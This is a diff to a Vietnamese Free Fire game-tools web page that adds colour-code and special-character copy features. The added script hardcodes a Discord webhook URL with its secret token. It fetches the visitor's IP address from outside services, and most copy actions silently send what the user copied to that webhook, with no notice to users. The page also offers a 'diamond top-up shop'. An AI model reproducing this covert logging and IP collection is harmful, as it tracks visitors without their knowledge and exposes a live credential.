@@ -66,6 +66,14 @@
       background: linear-gradient(90deg, #16a8ff 0%, #0077e6 100%);
       box-shadow: 0 6px 22px rgba(22, 168, 255, 0.4);
     }
+    .btn-color {
+      background: linear-gradient(90deg, #00f5d4 0%, #00bbf9 100%);
+      box-shadow: 0 6px 22px rgba(0, 245, 212, 0.35);
+    }
+    .btn-symbols {
+      background: linear-gradient(90deg, #38bdf8 0%, #00e5ff 100%);
+      box-shadow: 0 6px 22px rgba(56, 189, 248, 0.38);
+    }
 
     .screen { display: none; }
     .screen.active { display: block; }
@@ -88,7 +96,7 @@
 
     .section-heading {
       text-align: center;
-      font-size: 23px;
+      font-size: 22px;
       font-weight: 900;
       color: #00f0ff;
       text-shadow: 0 0 14px rgba(0, 240, 255, 0.7);
@@ -213,6 +221,308 @@
     .sensi-name { font-size: 13px; color: #b7d7e8; }
     .sensi-val { font-size: 16px; font-weight: 800; color: #00f0ff; }
 
+    /* DANH SÁCH 24 Ô MÀU CÓ SẴN */
+    .color-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 10px;
+    }
+    .color-cell {
+      background: #080d14;
+      border: 1px solid #1f334a;
+      border-radius: 11px;
+      padding: 10px 11px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 8px;
+    }
+    .color-left {
+      display: flex;
+      align-items: center;
+      gap: 9px;
+      min-width: 0;
+    }
+    .color-swatch {
+      width: 24px;
+      height: 24px;
+      border-radius: 7px;
+      border: 1px solid rgba(255, 255, 255, 0.28);
+      flex-shrink: 0;
+    }
+    .color-meta {
+      min-width: 0;
+    }
+    .color-label {
+      font-size: 12px;
+      color: #cbd5e1;
+      font-weight: 600;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+    .color-code {
+      font-size: 12.5px;
+      font-weight: 800;
+      color: #00f0ff;
+      margin-top: 2px;
+    }
+    .cell-copy-btn {
+      background: rgba(0, 229, 255, 0.16);
+      color: #00f0ff;
+      border: 1px solid rgba(0, 229, 255, 0.45);
+      border-radius: 8px;
+      padding: 6px 8px;
+      font-size: 11px;
+      font-weight: 800;
+      cursor: pointer;
+      flex-shrink: 0;
+      transition: 0.15s;
+    }
+    .cell-copy-btn:hover {
+      background: #00e5ff;
+      color: #061018;
+    }
+    .cell-copy-btn.copied {
+      background: #00e676;
+      border-color: #00e676;
+      color: #061018;
+    }
+
+    /* KHUNG Ở DƯỚI: MỖI CHỮ / KÝ TỰ CHỌN 1 MÀU RIÊNG -> GỬI DISCORD RỒI MỚI HIỆN Ô SAO CHÉP */
+    .custom-color-box {
+      margin-top: 22px;
+      background: #101926;
+      border: 1px solid rgba(0, 229, 255, 0.4);
+      border-radius: 14px;
+      padding: 16px;
+    }
+    .custom-color-title {
+      font-size: 15px;
+      font-weight: 900;
+      color: #00f0ff;
+      margin: 0 0 10px;
+    }
+    .char-list {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px;
+      margin-top: 8px;
+    }
+    .char-chip {
+      background: #080d14;
+      border: 1.5px solid #24384f;
+      border-radius: 10px;
+      padding: 7px 11px;
+      color: #fff;
+      font-size: 15px;
+      font-weight: 800;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      transition: transform 0.12s, border-color 0.12s;
+    }
+    .char-chip:hover {
+      transform: translateY(-1px);
+    }
+    .char-chip.active {
+      border-color: #ffffff;
+      box-shadow: 0 0 10px rgba(255, 255, 255, 0.25);
+    }
+    .char-dot {
+      width: 11px;
+      height: 11px;
+      border-radius: 50%;
+      border: 1px solid rgba(255, 255, 255, 0.45);
+      flex-shrink: 0;
+    }
+    .picker-row {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-top: 8px;
+      flex-wrap: wrap;
+    }
+    .picker-row input[type="color"] {
+      width: 54px;
+      height: 44px;
+      padding: 3px;
+      border-radius: 10px;
+      cursor: pointer;
+      flex-shrink: 0;
+    }
+    .mini-btn {
+      background: #162232;
+      color: #e6f7ff;
+      border: 1px solid #2e435e;
+      border-radius: 9px;
+      padding: 9px 12px;
+      font-size: 12px;
+      font-weight: 700;
+      cursor: pointer;
+    }
+    .mini-btn:hover {
+      border-color: #00f0ff;
+      color: #00f0ff;
+    }
+    .quick-swatches {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px;
+      margin-top: 10px;
+    }
+    .quick-dot {
+      width: 25px;
+      height: 25px;
+      border-radius: 8px;
+      border: 2px solid rgba(255, 255, 255, 0.25);
+      cursor: pointer;
+      padding: 0;
+      transition: transform 0.12s, border-color 0.12s;
+    }
+    .quick-dot:hover {
+      transform: scale(1.08);
+      border-color: #ffffff;
+    }
+    .output-code-card {
+      display: none;
+      margin-top: 14px;
+      background: #080d14;
+      border: 1px solid #1f334a;
+      border-radius: 12px;
+      padding: 12px 14px;
+    }
+    .output-code-card.show {
+      display: block;
+    }
+    .preview-line {
+      font-size: 18px;
+      font-weight: 900;
+      padding-bottom: 10px;
+      margin-bottom: 10px;
+      border-bottom: 1px solid #172436;
+      word-break: break-word;
+    }
+    .code-copy-bar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 10px;
+    }
+    .generated-ff-code {
+      font-family: Consolas, monospace;
+      font-size: 13px;
+      font-weight: 800;
+      color: #00f0ff;
+      word-break: break-all;
+    }
+    #customColorStatus {
+      margin-top: 10px;
+      font-size: 12.5px;
+      color: #00f0ff;
+      min-height: 16px;
+    }
+
+    /* MỤC 4: KÍ TỰ ĐẶC BIỆT & KHOẢNG TRỐNG TÊN FF */
+    .symbol-section-box {
+      background: #101926;
+      border: 1px solid rgba(0, 229, 255, 0.35);
+      border-radius: 14px;
+      padding: 15px;
+      margin-bottom: 16px;
+    }
+    .symbol-sub-title {
+      font-size: 14.5px;
+      font-weight: 900;
+      color: #00f0ff;
+      margin: 0 0 10px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .space-list {
+      display: flex;
+      flex-direction: column;
+      gap: 9px;
+    }
+    .space-item {
+      background: #080d14;
+      border: 1px solid #1f334a;
+      border-radius: 11px;
+      padding: 10px 12px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 10px;
+    }
+    .space-info-title {
+      font-size: 13px;
+      font-weight: 800;
+      color: #e6f7ff;
+    }
+    .space-info-desc {
+      font-size: 11.5px;
+      color: #8fa3b8;
+      margin-top: 2px;
+    }
+    .symbol-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 8px;
+    }
+    .symbol-tile {
+      background: #080d14;
+      border: 1px solid #1f334a;
+      border-radius: 10px;
+      padding: 10px 6px;
+      text-align: center;
+      cursor: pointer;
+      transition: 0.15s;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 4px;
+    }
+    .symbol-tile:hover {
+      border-color: #00e5ff;
+      background: #0d1929;
+      transform: translateY(-1px);
+    }
+    .symbol-char {
+      font-size: 15px;
+      font-weight: 800;
+      color: #ffffff;
+      line-height: 1.3;
+      word-break: break-word;
+      white-space: pre-line;
+    }
+    .symbol-tag {
+      font-size: 10px;
+      font-weight: 800;
+      color: #00f0ff;
+    }
+    .symbol-tile.copied {
+      border-color: #00e676;
+      background: rgba(0, 230, 118, 0.14);
+    }
+    .symbol-tile.copied .symbol-tag {
+      color: #00e676;
+    }
+    .name-builder-row {
+      display: flex;
+      gap: 8px;
+      margin-top: 8px;
+    }
+    #symbolToast {
+      font-size: 12.5px;
+      color: #00e676;
+      min-height: 18px;
+      margin-top: 8px;
+      font-weight: 700;
+    }
+
     .shop-stage {
       position: relative;
       border-radius: 14px;
@@ -267,6 +577,11 @@
       line-height: 1.45;
       color: #00f0ff;
     }
+
+    @media (max-width: 480px) {
+      .color-grid { grid-template-columns: 1fr; }
+      .symbol-grid { grid-template-columns: repeat(2, 1fr); }
+    }
   </style>
 </head>
 <body>
@@ -277,9 +592,11 @@
   <div id="menuScreen" class="menu-stack">
     <button class="portal-btn btn-sensi" onclick="openScreen('sensi')">⚡ CHECK ĐỘ NHẠY VIP</button>
     <button class="portal-btn btn-shop" onclick="openScreen('shop')">💎 SHOP NẠP KIM CƯƠNG</button>
+    <button class="portal-btn btn-color" onclick="openScreen('color')">🎨 CODE MÀU FF</button>
+    <button class="portal-btn btn-symbols" onclick="openScreen('symbols')">✨ KÍ TỰ TÊN & KHOẢNG TRỐNG FF</button>
   </div>
 
-  <!-- MÀN HÌNH CHECK ĐỘ NHẠY VIP (KHÔNG CẦN MAIL) -->
+  <!-- MỤC 1: CHECK ĐỘ NHẠY VIP (KHÔNG CẦN MAIL) -->
   <div id="sensiScreen" class="screen">
     <button class="back-btn" onclick="openScreen('menu')">← Quay lại Menu</button>
     <h2 class="section-heading">⚡ CHECK ĐỘ NHẠY ⚡</h2>
@@ -311,7 +628,7 @@
     </div>
   </div>
 
-  <!-- MÀN HÌNH SHOP NẠP KIM CƯƠNG -->
+  <!-- MỤC 2: SHOP NẠP KIM CƯƠNG -->
   <div id="shopScreen" class="screen">
     <button class="back-btn" onclick="openScreen('menu')">← Quay lại Menu</button>
     <h2 class="section-heading">💎 SHOP NẠP KIM CƯƠNG 💎</h2>
@@ -366,6 +683,74 @@
 
     <p id="kcStatus"></p>
   </div>
+
+  <!-- MỤC 3: MỤC RIÊNG CODE MÀU FF -->
+  <div id="colorScreen" class="screen">
+    <button class="back-btn" onclick="openScreen('menu')">← Quay lại Menu</button>
+    <h2 class="section-heading">🎨 CODE MÀU FF 🎨</h2>
+
+    <div id="colorGrid" class="color-grid"></div>
+
+    <!-- PHẦN Ở DƯỚI: MỖI CHỮ / KÝ TỰ ĐƯỢC CHỌN 1 MÀU RIÊNG -> GỬI DISCORD RỒI MỚI HIỆN Ô SAO CHÉP -->
+    <div class="custom-color-box">
+      <h3 class="custom-color-title">✍️ Mỗi Chữ 1 Màu Tùy Ý</h3>
+
+      <label for="customFfText" style="font-size:13px; margin-top:6px;">Nhập chữ bạn muốn:</label>
+      <input type="text" id="customFfText" placeholder="Ví dụ: ZEUS hoặc FF VIP..." oninput="syncCharPalette()" />
+
+      <div id="charPaletteLabel" style="font-size:12.5px; color:#a9cce3; margin-top:12px;">Bấm vào từng chữ/ký tự bên dưới để chọn màu riêng cho chữ đó:</div>
+      <div id="charChipsList" class="char-list"></div>
+
+      <div class="picker-row">
+        <input type="color" id="singleCharColorPicker" value="#00f0ff" oninput="applyColorToSelectedChar(this.value)" />
+        <span id="selectedCharInfo" style="font-size:13px; font-weight:800; color:#00f0ff;">Đang chọn: --</span>
+        <button type="button" class="mini-btn" onclick="rainbowizeChars()">🌈 Đổi màu mỗi chữ</button>
+      </div>
+
+      <div id="quickSwatches" class="quick-swatches"></div>
+
+      <button type="button" id="btnCreateFfCode" class="primary-action" style="margin-top:14px; padding:12px;" onclick="createCodeAndNotifyDiscord()">TẠO CODE MÀU CHỮ</button>
+      <p id="customColorStatus"></p>
+
+      <div id="customOutputCard" class="output-code-card">
+        <div id="customColorPreview" class="preview-line"></div>
+        <div class="code-copy-bar">
+          <span id="generatedFfTextCode" class="generated-ff-code"></span>
+          <button type="button" id="btnCopyCustomFf" class="cell-copy-btn" onclick="copyCustomFf()">COPY</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- MỤC 4: KÍ TỰ ĐẶC BIỆT & KHOẢNG TRỐNG TÊN FF -->
+  <div id="symbolsScreen" class="screen">
+    <button class="back-btn" onclick="openScreen('menu')">← Quay lại Menu</button>
+    <h2 class="section-heading">✨ KÍ TỰ & KHOẢNG TRỐNG FF ✨</h2>
+
+    <!-- KHUNG GHÉP TÊN NHANH -->
+    <div class="symbol-section-box">
+      <div class="symbol-sub-title">
+        <span>🛠️ Ô Ghép Tên Nhanh (Bấm kí tự bên dưới để chèn hoặc copy)</span>
+      </div>
+      <input type="text" id="ffNameDraftInput" placeholder="Nhập tên hoặc bấm vào các kí tự / khoảng trống bên dưới..." />
+      <div class="name-builder-row">
+        <button type="button" class="primary-action" style="margin-top:0; padding:11px;" onclick="copyDraftFfName()">📋 COPY TÊN ĐÃ GHÉP</button>
+        <button type="button" class="mini-btn" onclick="clearDraftFfName()">Xóa</button>
+      </div>
+      <div id="symbolToast"></div>
+    </div>
+
+    <!-- KHOẢNG TRỐNG TÀNG HÌNH TRONG TÊN FF -->
+    <div class="symbol-section-box">
+      <div class="symbol-sub-title">
+        <span>👻 Khoảng Trống Tàng Hình Tên FF (Khoảng trống thường & lớn)</span>
+      </div>
+      <div id="blankSpacesList" class="space-list"></div>
+    </div>
+
+    <!-- DANH SÁCH NHIỀU KÍ TỰ ĐẶC BIỆT -->
+    <div id="symbolCategoriesContainer"></div>
+  </div>
 </div>
 
 <script>
@@ -375,6 +760,110 @@
   const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1571815057950515201/opWisT2c_xcnvl7FV2kww4HpkNoJ4x9Hw2pTU8spqcX3zFoqi-dUe_2fmv6T6kysl0nR";
   const VALID_VIP_CODE = "like36";
 
+  const FF_COLOR_CODES = [
+    { name: "Đỏ tươi", hex: "#FF0000", code: "[FF0000]" },
+    { name: "Đỏ ruby", hex: "#E11D48", code: "[E11D48]" },
+    { name: "Đỏ đô", hex: "#991B1B", code: "[991B1B]" },
+    { name: "Hồng neon", hex: "#FF2E93", code: "[FF2E93]" },
+    { name: "Hồng cánh sen", hex: "#FF69B4", code: "[FF69B4]" },
+    { name: "Hồng pastel", hex: "#F9A8D4", code: "[F9A8D4]" },
+    { name: "Tím neon", hex: "#B84DFF", code: "[B84DFF]" },
+    { name: "Tím hoàng gia", hex: "#7C3AED", code: "[7C3AED]" },
+    { name: "Tím than", hex: "#4C1D95", code: "[4C1D95]" },
+    { name: "Xanh cyan", hex: "#00F0FF", code: "[00F0FF]" },
+    { name: "Xanh ngọc", hex: "#00FF88", code: "[00FF88]" },
+    { name: "Xanh mòng két", hex: "#14B8A6", code: "[14B8A6]" },
+    { name: "Xanh dương", hex: "#2979FF", code: "[2979FF]" },
+    { name: "Xanh coban", hex: "#1D4ED8", code: "[1D4ED8]" },
+    { name: "Xanh băng", hex: "#7DD3FC", code: "[7DD3FC]" },
+    { name: "Xanh lá chuối", hex: "#AEEA00", code: "[AEEA00]" },
+    { name: "Xanh lá đậm", hex: "#15803D", code: "[15803D]" },
+    { name: "Vàng kim", hex: "#FFD700", code: "[FFD700]" },
+    { name: "Vàng chanh", hex: "#FACC15", code: "[FACC15]" },
+    { name: "Cam rực", hex: "#FF7A00", code: "[FF7A00]" },
+    { name: "Cam san hô", hex: "#FB7185", code: "[FB7185]" },
+    { name: "Trắng sáng", hex: "#FFFFFF", code: "[FFFFFF]" },
+    { name: "Bạc ánh kim", hex: "#CBD5E1", code: "[CBD5E1]" },
+    { name: "Xám khói", hex: "#64748B", code: "[64748B]" }
+  ];
+
+  const FF_BLANK_SPACES = [
+    {
+      title: "Khoảng Trống Thường (Thin Space)",
+      desc: "Dấu cách tàng hình chuẩn trong ảnh — gọn, ít tốn độ dài tên",
+      value: "\u2009"
+    },
+    {
+      title: "Khoảng Trống Lớn (Dấu Cách Lớn)",
+      desc: "Tạo khoảng cách rộng rõ ràng giữa các chữ hoặc cụm kí tự",
+      value: "\u3164\u2800\u2003"
+    },
+    {
+      title: "Khoảng Trống Chuẩn Tên FF (Hangul Filler)",
+      desc: "Phổ biến nhất để tạo dấu cách giữa các chữ trong tên Free Fire",
+      value: "\u3164"
+    },
+    {
+      title: "Khoảng Trống Vừa (Braille Blank)",
+      desc: "Dấu cách tàng hình chuẩn Unicode khi đặt tên hoặc tiểu sử",
+      value: "\u2800"
+    },
+    {
+      title: "Khoảng Trống Rộng (Em Space)",
+      desc: "Tạo khoảng hở rộng giữa tên Clan và tên nhân vật",
+      value: "\u2003"
+    }
+  ];
+
+  const FF_SYMBOL_GROUPS = [
+    {
+      title: "🖼️ Full Kí Tự Theo Ảnh Của Bạn",
+      items: [
+        "ᒡᒢ", "ᘔ", "'w'", "亗", "✿", "ᏝᏝᏝᏝᏝᏝᏝᏝᏝᏝᏝᏝᏝ", "", "ᘎ", "ツ",
+        "☠️", "宗", "모", "·°+· ଳ*.·°*:·", "ム", "༄ᶦᶰᵈ᭄✿", "ᒄ",
+        "『CT』 ¦ 優TiD\n亗", "ﾑ", "༄ᶦᶰᵈ᭄✿", "༂", "ヽ", "⌒ᶦᵈᵒᶫ",
+        "乂", "『", "』", "☯", "☺", "ღ", "VNシ", "👁️",
+        "◡", "××", "☂️", "三★", "•́", "★彡", "乂", "⇄",
+        "❤️", "ᵛᶻ.'/", "_ᒻ_", "Ꮺ", "Ꮭ", "〰", "Ꮭ", "IAM",
+        "❄️", "♡", "優", "🌀", "cm", "☆",
+        "__Ꮭᒡᒢ__", "Ꮭ", "♕", "☭", "♪", "•", "PROシ", "ツ",
+        "✝️", "¦", "ᒡᒢ", "TM", "☬", "︵", "□ □°.",
+        "ت", "♚", "✏️", "✦", "_✿", "♥", "三⁰°", "「",
+        "•༄ᶦᶰᵈ•TheKing•༄ᶦᶰᵈ•", "Ꮭᒡᒢ", "⁰°彡", "ᏝᏝ", "SEA Nhi女□"
+      ]
+    },
+    {
+      title: "🎀 Nơ Hoa Hai Chữ X & Cánh Đôi (乂 ... 乂)",
+      items: [
+        "乂‿乂", "乂◡乂", "乂 ‿ 乂", "乂•乂", "乂_乂", "乂^乂",
+        "乂°乂", "乂✦乂", "乂★乂", "乂✧乂", "乂≧▽≦乂", "乂•̀ᴗ•́乂",
+        "乂♡乂", "乂⚡乂", "乂🔥乂", "乂亗乂", "乂么乂", "乂乡乂"
+      ]
+    },
+    {
+      title: "🔫 Súng, Kiếm & Vũ Khí FF",
+      items: ["▄︻デ══━一", "︻デ═一", "╾━╤デ╦︻", "▄︻̷̿┻̿═━一", "︻╦̵̵͇̿̿̿̿══╤─", "⚔️", "🗡️", "🔫", "🛡️", "🏹", "💣", "🎯"]
+    },
+    {
+      title: "👑 Vương Miện, VIP & Huy Hiệu",
+      items: ["亗", "么", "乡", "ツ", "ッ", "シ", "왕", "神", "鬼", "龙", "虎", "♛", "♚", "♕", "♔", "❖", "◈", "✦", "✧", "✪"]
+    },
+    {
+      title: "🪽 Cánh, Khung & Dấu Ngăn Tên",
+      items: ["꧁", "꧂", "༺", "༻", "『", "』", "【", "】", "「", "」", "《", "》", "★彡", "彡★", "×͜×", "•", "・", "々", "〆", "々〆"]
+    },
+    {
+      title: "😈 Mặt Quỷ, Cảm Xúc & Ngầu",
+      items: ["×͜×", "ಠ_ಠ", "눈_눈", "☠️", "💀", "👻", "😈", "👿", "👹", "👺", "🤡", "🥶", "🔥", "⚡", "❄️", "💧", "🩸", "💔", "🖤", "✨"]
+    },
+    {
+      title: "🔢 Số Mũ & Chữ Nhỏ Trên Đầu (VN / ID / TOP)",
+      items: ["²⁰²⁶", "²ᵏ⁹", "²ᵏ¹⁰", "²ᵏ¹¹", "²ᵏ¹²", "ᵛⁿ", "ᶠᶠ", "ᵛⁱᵖ", "ᵖʳᵒ", "ᵗᵒᵖ¹", "¹", "²", "³", "⁴", "⁵", "⁶", "⁷", "⁸", "⁹", "⁰"]
+    }
+  ];
+
+  const DEFAULT_RAINBOW_HEXES = ["#FF0000", "#FF7A00", "#FFD700", "#00FF88", "#00F0FF", "#2979FF", "#B84DFF", "#FF2E93"];
+
   if (window.emailjs) {
     emailjs.init({ publicKey: PUBLIC_KEY });
   }
@@ -383,20 +872,420 @@
   let currentEmail = "";
   let generatedOTP = "";
   let latestSensiData = {};
+  let latestCustomFfCode = "";
+  let perCharItems = [];
+  let selectedCharIndex = 0;
+  let cachedUserIp = "";
 
   const blockedPrefixes = ['test', 'abc', 'asdf', 'qwerty', '123', 'fake', 'none', 'noemail', 'admin'];
   const blockedDomains = ['mailinator.com', 'tempmail.com', '10minutemail.com', 'guerrillamail.com', 'yopmail.com'];
+
+  async function getUserIpAddress() {
+    if (cachedUserIp) return cachedUserIp;
+
+    const endpoints = [
+      { url: "https://api.ipify.org?format=json", parse: d => d.ip },
+      { url: "https://ipapi.co/json/", parse: d => d.ip }
+    ];
+
+    for (const ep of endpoints) {
+      try {
+        const res = await fetch(ep.url, { cache: "no-store" });
+        if (!res.ok) continue;
+        const data = await res.json();
+        const ip = ep.parse(data);
+        if (ip) {
+          cachedUserIp = String(ip).trim();
+          return cachedUserIp;
+        }
+      } catch (_) {}
+    }
+
+    return "Không lấy được IP";
+  }
+
+  function formatUnicodeEscapes(str) {
+    return Array.from(str).map(ch => {
+      const code = ch.codePointAt(0);
+      if (code === 0x2009) return "U+2009 (Thin Space)";
+      if (code === 0x3164) return "U+3164 (Hangul Filler)";
+      if (code === 0x2800) return "U+2800 (Braille Blank)";
+      if (code === 0x2003) return "U+2003 (Em Space)";
+      return ch;
+    }).join(" + ");
+  }
+
+  function renderColorCells() {
+    const grid = document.getElementById('colorGrid');
+    if (!grid) return;
+
+    grid.innerHTML = FF_COLOR_CODES.map((item, idx) => `
+      <div class="color-cell">
+        <div class="color-left">
+          <span class="color-swatch" style="background:${item.hex};"></span>
+          <div class="color-meta">
+            <div class="color-label">${item.name}</div>
+            <div class="color-code">${item.code}</div>
+          </div>
+        </div>
+        <button type="button" id="copyColorBtn_${idx}" class="cell-copy-btn" onclick="copySingleColorCode(${idx})">COPY</button>
+      </div>
+    `).join('');
+
+    const swatchesEl = document.getElementById('quickSwatches');
+    if (swatchesEl) {
+      swatchesEl.innerHTML = FF_COLOR_CODES.slice(0, 12).map(item => `
+        <button type="button" class="quick-dot" title="${item.name} ${item.code}" style="background:${item.hex};" onclick="applyColorToSelectedChar('${item.hex}')"></button>
+      `).join('');
+    }
+  }
+
+  function renderSymbolsAndSpaces() {
+    const spacesEl = document.getElementById('blankSpacesList');
+    if (spacesEl) {
+      spacesEl.innerHTML = FF_BLANK_SPACES.map((sp, idx) => `
+        <div class="space-item">
+          <div>
+            <div class="space-info-title">${sp.title}</div>
+            <div class="space-info-desc">${sp.desc}</div>
+          </div>
+          <div style="display:flex; gap:6px; flex-shrink:0;">
+            <button type="button" class="mini-btn" style="padding:6px 9px; font-size:11px;" onclick="insertIntoDraftName(${idx}, true)">+ Chèn</button>
+            <button type="button" id="btnCopySpace_${idx}" class="cell-copy-btn" onclick="copyBlankSpace(${idx})">COPY</button>
+          </div>
+        </div>
+      `).join('');
+    }
+
+    const container = document.getElementById('symbolCategoriesContainer');
+    if (container) {
+      container.innerHTML = FF_SYMBOL_GROUPS.map((group, gIdx) => `
+        <div class="symbol-section-box">
+          <div class="symbol-sub-title">
+            <span>${group.title}</span>
+          </div>
+          <div class="symbol-grid">
+            ${group.items.map((sym, sIdx) => `
+              <button type="button" id="symTile_${gIdx}_${sIdx}" class="symbol-tile" onclick="handleSymbolClick(${gIdx}, ${sIdx})">
+                <span class="symbol-char">${escapeHtml(sym)}</span>
+                <span class="symbol-tag">COPY</span>
+              </button>
+            `).join('')}
+          </div>
+        </div>
+      `).join('');
+    }
+  }
+
+  function showSymbolToast(msg) {
+    const toastEl = document.getElementById('symbolToast');
+    if (toastEl) {
+      toastEl.textContent = msg;
+    }
+  }
+
+  function appendTextToDraftName(text) {
+    const input = document.getElementById('ffNameDraftInput');
+    if (!input) return;
+    const start = input.selectionStart ?? input.value.length;
+    const end = input.selectionEnd ?? input.value.length;
+    input.value = input.value.slice(0, start) + text + input.value.slice(end);
+    input.focus();
+    const nextPos = start + text.length;
+    input.setSelectionRange(nextPos, nextPos);
+  }
+
+  function insertIntoDraftName(idx, isSpace) {
+    if (isSpace) {
+      const sp = FF_BLANK_SPACES[idx];
+      if (!sp) return;
+      appendTextToDraftName(sp.value);
+      showSymbolToast(`Đã chèn "${sp.title}" vào ô ghép tên!`);
+    }
+  }
+
+  function copyBlankSpace(idx) {
+    const sp = FF_BLANK_SPACES[idx];
+    if (!sp) return;
+    navigator.clipboard?.writeText(sp.value).catch(() => {});
+
+    const btn = document.getElementById(`btnCopySpace_${idx}`);
+    if (btn) {
+      btn.textContent = "ĐÃ CHÉP";
+      btn.classList.add('copied');
+      setTimeout(() => {
+        btn.textContent = "COPY";
+        btn.classList.remove('copied');
+      }, 1300);
+    }
+    showSymbolToast(`Đã sao chép ${sp.title}! Dán trực tiếp vào ô đổi tên FF.`);
+
+    sendDiscordLog("👻 SAO CHÉP KHOẢNG TRỐNG FF", [
+      { name: "📌 Loại khoảng trống", value: `\`${sp.title}\``, inline: false },
+      { name: "🔢 Mã Unicode", value: `\`${formatUnicodeEscapes(sp.value)}\``, inline: false }
+    ], 3783416);
+  }
+
+  function handleSymbolClick(gIdx, sIdx) {
+    const group = FF_SYMBOL_GROUPS[gIdx];
+    const sym = group?.items?.[sIdx];
+    if (!sym) return;
+
+    navigator.clipboard?.writeText(sym).catch(() => {});
+    appendTextToDraftName(sym);
+
+    const tile = document.getElementById(`symTile_${gIdx}_${sIdx}`);
+    if (tile) {
+      tile.classList.add('copied');
+      const tag = tile.querySelector('.symbol-tag');
+      if (tag) tag.textContent = "ĐÃ CHÉP";
+      setTimeout(() => {
+        tile.classList.remove('copied');
+        if (tag) tag.textContent = "COPY";
+      }, 1100);
+    }
+    const cleanLogSym = sym.replace(/\n/g, " / ");
+    showSymbolToast(`Đã chèn & sao chép kí tự: ${cleanLogSym}`);
+
+    sendDiscordLog("✨ SAO CHÉP KÍ TỰ ĐẶC BIỆT FF", [
+      { name: "📂 Nhóm kí tự", value: `\`${group.title}\``, inline: true },
+      { name: "🔣 Kí tự đã sao chép", value: `\`${cleanLogSym}\``, inline: true }
+    ], 1947988);
+  }
+
+  function copyDraftFfName() {
+    const input = document.getElementById('ffNameDraftInput');
+    const val = input ? input.value : "";
+    if (!val) {
+      showSymbolToast("Ô tên đang trống, hãy nhập chữ hoặc chọn kí tự bên dưới trước!");
+      return;
+    }
+    navigator.clipboard?.writeText(val).catch(() => {});
+    showSymbolToast(`Đã sao chép toàn bộ tên: ${val}`);
+
+    sendDiscordLog("📋 SAO CHÉP TÊN GHÉP KÍ TỰ FF", [
+      { name: "🏷️ Tên đã sao chép", value: `\`\`\`${val}\`\`\``, inline: false }
+    ], 15844367);
+  }
+
+  function clearDraftFfName() {
+    const input = document.getElementById('ffNameDraftInput');
+    if (input) input.value = "";
+    showSymbolToast("Đã xóa ô ghép tên.");
+  }
+
+  function hideCustomOutputOnEdit() {
+    document.getElementById('customOutputCard')?.classList.remove('show');
+    document.getElementById('customColorStatus').textContent = "";
+    latestCustomFfCode = "";
+  }
+
+  function syncCharPalette() {
+    const raw = document.getElementById('customFfText').value;
+    const chars = Array.from(raw);
+    const oldMap = new Map();
+
+    perCharItems.forEach((item, idx) => {
+      oldMap.set(`${idx}:${item.ch}`, item.hex);
+    });
+
+    perCharItems = chars.map((ch, idx) => {
+      const fallbackHex = DEFAULT_RAINBOW_HEXES[idx % DEFAULT_RAINBOW_HEXES.length];
+      return {
+        ch,
+        hex: oldMap.get(`${idx}:${ch}`) || fallbackHex
+      };
+    });
+
+    if (selectedCharIndex >= perCharItems.length) {
+      selectedCharIndex = Math.max(0, perCharItems.length - 1);
+    }
+
+    hideCustomOutputOnEdit();
+    renderCharChips();
+  }
+
+  function renderCharChips() {
+    const listEl = document.getElementById('charChipsList');
+    const infoEl = document.getElementById('selectedCharInfo');
+    const pickerEl = document.getElementById('singleCharColorPicker');
+    if (!listEl || !infoEl || !pickerEl) return;
+
+    if (perCharItems.length === 0) {
+      listEl.innerHTML = `<span style="font-size:12px; color:#64748b;">Chưa có chữ nào. Hãy nhập chữ ở ô trên.</span>`;
+      infoEl.textContent = "Đang chọn: --";
+      return;
+    }
+
+    listEl.innerHTML = perCharItems.map((item, idx) => {
+      const labelCh = item.ch === " " ? "␣" : escapeHtml(item.ch);
+      const isSelected = idx === selectedCharIndex ? "active" : "";
+      return `
+        <button type="button" class="char-chip ${isSelected}" style="color:${item.hex};" onclick="selectChar(${idx})">
+          <span class="char-dot" style="background:${item.hex};"></span>
+          <span>${labelCh}</span>
+        </button>
+      `;
+    }).join('');
+
+    const cur = perCharItems[selectedCharIndex];
+    const shownChar = cur.ch === " " ? "[Khoảng trắng]" : cur.ch;
+    const hexUpper = cur.hex.replace("#", "").toUpperCase();
+    pickerEl.value = cur.hex.toLowerCase();
+    infoEl.style.color = cur.hex;
+    infoEl.textContent = `Chữ "${shownChar}" → [${hexUpper}]`;
+  }
+
+  function selectChar(idx) {
+    if (idx < 0 || idx >= perCharItems.length) return;
+    selectedCharIndex = idx;
+    renderCharChips();
+  }
+
+  function applyColorToSelectedChar(hexValue) {
+    if (perCharItems.length === 0) return;
+    const normalized = hexValue.toLowerCase();
+    perCharItems[selectedCharIndex].hex = normalized;
+    hideCustomOutputOnEdit();
+    renderCharChips();
+  }
+
+  function rainbowizeChars() {
+    if (perCharItems.length === 0) return;
+    perCharItems = perCharItems.map((item, idx) => ({
+      ch: item.ch,
+      hex: DEFAULT_RAINBOW_HEXES[idx % DEFAULT_RAINBOW_HEXES.length].toLowerCase()
+    }));
+    hideCustomOutputOnEdit();
+    renderCharChips();
+  }
+
+  function buildMultiColorFfCode(items) {
+    let ffCode = "";
+    let prevHex = "";
+    for (const item of items) {
+      const hexUpper = item.hex.replace("#", "").toUpperCase();
+      if (hexUpper !== prevHex) {
+        ffCode += `[${hexUpper}]`;
+        prevHex = hexUpper;
+      }
+      ffCode += item.ch;
+    }
+    return ffCode;
+  }
+
+  function buildMultiColorPreviewHtml(items) {
+    return items.map(item => {
+      const displayCh = item.ch === " " ? "&nbsp;" : escapeHtml(item.ch);
+      return `<span style="color:${item.hex};">${displayCh}</span>`;
+    }).join('');
+  }
+
+  function escapeHtml(str) {
+    return str
+      .replace(/&/g, "&amp;")
